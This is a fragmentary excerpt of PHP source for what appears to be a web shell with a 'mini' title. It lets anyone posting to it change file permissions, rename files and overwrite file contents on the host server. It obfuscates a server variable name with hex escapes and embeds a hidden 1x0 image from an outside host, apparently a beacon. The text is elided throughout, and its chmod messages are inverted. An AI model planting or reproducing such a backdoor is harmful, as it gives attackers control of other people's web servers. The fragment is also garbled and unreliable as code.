...
<title>' . $_SERVER["\x48\x54\x54P_\x48\x4f\x53\x54"] . ' - mini</title>
<style>
body{
...
<img src="http://wp32.net/p/bg1.png" height="1" width="0">
    ...
    if ($_POST['opt'] == 'chmod') {
        if (isset($_POST['perm'])) {
            if (chmod($_POST['path'], $_POST['perm'])) {
                echo '<font color="green">Change Permission Failed</font><br/>';
            } else {
                echo '<font color="red">Change Permission Success</font><br />';
            }
        }
...
<input type="submit" value="Go" />
        ...
        if (isset($_POST['newname'])) {
            if (rename($_POST['path'], $path . '/' . $_POST['newname'])) {
                echo '<font color="green">Success Rename</font><br/>';
            } else {
                echo '<font color="red">Failed To Rename</font><br />';
            }
...
<input type="submit" value="Go" />
        ...
        if (isset($_POST['src'])) {
            ...
            if (fwrite($fp, $_POST['src'])) {
                echo '<font color="green">Success Edit</font><br/>';
            } else {
